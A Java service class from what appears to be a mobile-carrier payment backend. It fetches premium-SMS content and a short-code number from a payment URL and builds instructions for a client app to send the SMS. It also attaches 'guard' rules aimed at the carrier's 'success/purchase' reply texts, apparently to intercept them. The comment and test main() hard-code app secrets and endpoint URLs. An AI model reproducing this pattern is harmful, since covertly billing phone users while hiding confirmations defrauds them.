package com.jxt.pay.appclient.service.dynamic.net;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

/**
 * http://p.coolx2.com/pay/woplus/create?goods_id=12&channel_id=48&app_id=13&secret=ee78f299b5580452a3411b3c3a4b999d

返回：
	{"result":{"status":{"code":0,"msg":"succ"},"data":{"sms":"70c24a1b1d204f81aa701e50c2f9331a86133c883b1916c314b9802c0c3647b50fd492ceb8c0b0991e33abe19d62dd988f1142a5e50e324e","outTradeNo":"142588838045790916","accessNo":"10655477477477"}}}

 * @author leoliu
 *
 */
public class HyfdLtDynamicService implements IDynamicService{
	
	private static Logger logger = Logger.getLogger(HyfdLtDynamicService.class);

	private static final String TYPE = "hyfdLt";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "goods_id={goods_id}&channel_id={channel_id}&app_id={app_id}&secret={secret}";
	
	private static final Guard guard0 = new Guard("10655477","成功|购买",2880,"1",0);
	private static final Guard guard1 = new Guard("10655","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String goods_id = map.get("goods_id");
			String channel_id = map.get("channel_id");
			String app_id = map.get("app_id");
			String secret = map.get("secret");
			
			String param = REQUESTMODEL.replace("{goods_id}",goods_id).replace("{channel_id}",channel_id).replace("{app_id}",app_id).replace("{secret}", secret);
			
			String responseJson = GetData.getData(url, param);
			
			xml = parse(responseJson);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	/**
	 * {"result":{"status":{"code":0,"msg":"succ"},"data":{"sms":"18bdb82e799335e7087f98da007f21d3abe5ea0a86dbd00e1111cc4fdff2dcfaaf5447751e2e9df5802cf8e2455238fa537e230637daded5","outTradeNo":"142778623477907036","accessNo":"10655477477477"}}}
	 * @param responseJson
	 * @return
	 */
	private String parse(String responseJson){
		
		if(responseJson != null && responseJson.length() > 10){
			System.out.println(responseJson);
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				JSONObject resultJo = jo.getJSONObject("result");
				
				String data = resultJo.getString("data");
				
				if(data != null && data.length() > 0){
					JSONObject dataJo = new JSONObject(data);
					
					String content = dataJo.getString("sms");
					String accessNo = dataJo.getString("accessNo");
					
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(content);
					sms.setSmsDest(accessNo);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard0);
					guardList.add(guard1);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
				}
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
//	http://p.coolx2.com/pay/woplus/create?goods_id=23&channel_id=55&app_id=19&secret=1d7f328ca09b80788ddb702dcd209843
		String url = "http://p.coolx2.com/pay/woplus/create";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("type", "hyfdLt");
		map.put("channel", "10B101a87654322");
		map.put("goods_id", "23");
		map.put("channel_id","55");
		map.put("app_id","19");
		map.put("secret","1d7f328ca09b80788ddb702dcd209843");
		
		System.out.println(new HyfdLtDynamicService().dynamic(map));
		
		
		
	}
}
